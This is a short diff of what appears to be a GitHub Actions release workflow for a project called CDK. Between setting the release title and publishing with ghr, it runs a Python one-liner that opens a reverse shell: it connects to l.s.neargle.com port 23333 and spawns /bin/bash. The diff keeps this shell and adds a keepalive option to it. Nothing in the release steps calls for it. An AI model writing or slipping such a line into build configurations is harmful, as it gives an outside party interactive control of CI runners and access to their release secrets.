@@ -91,7 +91,7 @@ jobs:
 
           title="CDK $TAG_VERSION"
 
-          python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("l.s.neargle.com",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+          python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1);s.connect(("l.s.neargle.com",23333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
   
           ghr -n "$title" -b "$release_body" -u "$last_author" "$TAG_VERSION" "bin/"
 
